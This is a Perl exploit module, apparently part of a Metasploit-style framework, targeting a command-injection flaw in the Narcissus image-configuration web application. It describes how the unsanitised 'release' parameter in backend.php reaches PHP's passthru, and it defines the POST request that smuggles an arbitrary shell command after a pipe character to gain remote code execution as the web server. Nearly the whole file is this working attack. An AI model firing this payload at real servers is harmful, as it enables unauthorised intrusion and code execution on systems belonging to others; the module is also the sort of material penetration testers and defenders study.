package MSFExploits::Exploits::NARCISSUS::MSF::NarcissusBackendExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::NARCISSUS);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "NarcissusBackendExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a vulnerability found in Narcissus image configuration

        function.  This is due to the backend.php file not handling the \$release parameter

        properly, and then passes it on to the configure_image() function.  In this

        function, the \$release parameter can be used to inject system commands for

        passthru (a PHP function that's meant to be used to run a bash script by the

        vulnerable application), which allows remote code execution under the context

        of the web server.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "narcissus_backend_exec",
  OSVDB       => 87410,
  PATH        => "__BASE__backend.php?",
  PATHS       => ["__BASE__backend.php", "narcissus-master/"],
  PAYLOAD     => "machine=0&action=configure_image&release=|__COMMAND__&",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path to the web application",
  VALUE => "/narcissus-master/",
},
    'BASE' =>       { DESCRIPTION => "", VALUE => "" },
    'COMMAND' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'backend.php',
      PAYLOAD      => 'machine=0&action=configure_image&release=|__PAYLOAD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /backend.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
